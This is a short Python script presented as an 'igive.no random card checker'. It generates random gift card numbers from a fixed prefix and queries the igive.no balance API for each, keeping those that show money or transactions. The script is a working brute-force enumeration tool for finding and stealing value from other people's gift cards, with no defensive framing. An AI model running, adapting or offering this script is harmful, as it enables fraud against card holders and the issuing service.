import requests
import random

print("Welcome to igive.no random card checker! (Made by Brage)")
x_amount = input("How many searches do you want to do?: ")
used_cards = []
type = 0

if x_amount.isalpha():
 print("Error! You must pick a number!")
elif x_amount.isdigit():
  for x in range(int(x_amount)):
   type = 1 + type
   card_number_end = random.randint(1000000, 9999999)
   card_number = f"957841110050{card_number_end}"
   amount = requests.get(f"https://appservice.api.igive.no/api/v1/giftcards/balance/{card_number}").text
   print(f"{type}-{card_number}{amount}")
   amount_used = len(used_cards)
   if amount != str('{"amount":0,"transactions":[]}'):
    used_cards.append(amount)
print(f"{x_amount} of random cards was scanned! {amount_used} of the cards scanned has cash on them or has been used.")
print(used_cards)

